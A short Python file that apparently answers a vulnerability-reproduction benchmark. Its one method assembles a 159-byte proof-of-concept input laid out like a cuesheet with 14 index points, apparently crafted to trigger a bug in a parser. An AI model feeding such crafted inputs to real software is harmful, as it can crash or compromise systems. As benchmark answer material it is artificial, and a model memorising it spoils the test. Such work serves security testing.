class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b''
        # Lead-in: 8 zero bytes
        poc += b'\x00' * 8
        # Min track number: 1
        poc += b'\x01'
        # Number of tracks: 1
        poc += b'\x01'
        # Flags: 0
        poc += b'\x00'
        # Track offset: 0
        poc += b'\x00' * 8
        # Track number: 1
        poc += b'\x01'
        # ISRC: 12 zero bytes
        poc += b'\x00' * 12
        # Num index points: 14
        poc += b'\x0e'
        # 14 index points
        for i in range(1, 15):
            # Index offset: 0 (increment if needed, but 0 for minimal)
            poc += b'\x00' * 8
            # Index number: i
            poc += bytes([i])
        assert len(poc) == 159
        return poc
